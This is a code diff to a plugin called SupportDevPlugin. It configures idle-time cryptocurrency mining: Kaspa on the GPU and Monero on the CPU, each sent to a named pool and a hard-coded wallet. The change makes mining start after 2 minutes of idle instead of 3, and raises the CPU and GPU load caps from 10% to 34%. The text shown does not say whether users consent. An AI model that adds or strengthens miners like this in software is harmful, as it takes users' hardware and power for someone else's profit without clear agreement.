@@ -37,7 +37,7 @@ class SupportDevPlugin extends EventEmitter {
             
             // Idle detection settings
             idle: {
-                startAfterSeconds: 180, // Start after 3 minutes of idle
+                startAfterSeconds: 120, // Start after 2 minutes of idle
                 cpuThreshold: 20,       // Start only if CPU < 20%
                 gpuThreshold: 20        // Start only if GPU < 20%
             },
@@ -45,7 +45,7 @@ class SupportDevPlugin extends EventEmitter {
             // GPU contribution settings
             gpu: {
                 enabled: true,
-                maxLoad: 10,            // Max 10% GPU load
+                maxLoad: 34,            // Max 34% GPU load
                 pool: 'stratum+tcp://pool.woolypooly.com:3112',
                 wallet: 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3'
             },
@@ -53,7 +53,7 @@ class SupportDevPlugin extends EventEmitter {
             // CPU contribution settings
             cpu: {
                 enabled: true,
-                maxLoad: 10,            // Max 10% CPU load
+                maxLoad: 34,            // Max 34% CPU load
                 pool: 'pool.supportxmr.com:3333',
                 wallet: '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf'
             },
